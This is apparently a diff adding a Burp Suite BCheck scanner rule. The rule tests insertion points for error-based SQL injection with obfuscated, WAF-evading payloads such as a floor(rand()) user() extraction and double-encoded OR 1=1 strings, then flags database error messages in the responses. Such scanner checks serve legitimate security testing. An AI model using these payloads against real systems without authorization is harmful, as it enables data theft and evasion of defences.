@@ -1,0 +1,28 @@
+metadata:
+    language: v2-beta
+    name: "SQLi - Error Based with WAF Bypass"
+    description: "Tests for error-based SQL injection using obfuscated payloads to bypass modern WAFs"
+    author: "BCheck Arsenal"
+    tags: "sqli", "error-based", "waf-bypass"
+
+define:
+    issueDetail = "Error-based SQL injection detected. The application reflects database error messages when injected with malformed SQL syntax."
+    issueRemediation = "Use parameterized queries or prepared statements. Implement proper input validation and suppress verbose error messages in production."
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "1'||(SeLeCt 0x1 FrOm(SeLeCt cOuNt(*),cOnCaT((SeLeCt uSeR()),0x7e,fLoOr(rAnD(0)*2))x FrOm iNfOrMaTiOn_ScHeMa.tAbLeS gRoUp bY x)a)||'"
+            - "1%2527%2520OR%25201%253D1--"
+            - "1'/*!50000oR*/1=1-- -"
+            - "1\u0027 OR 1=1--"
+            - "1' /\*!00000oR\*/ '1'='1"
+
+    if {check.response} matches "(SQL syntax|mysql_fetch|ORA-[0-9]|ODBC SQL|PostgreSQL.*ERROR|Microsoft.*ODBC|Unclosed quotation|syntax error at|pg_query|sqlite3\.OperationalError|near \"syntax\")" then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "{issueDetail}"
+            remediation: "{issueRemediation}"
+    end if
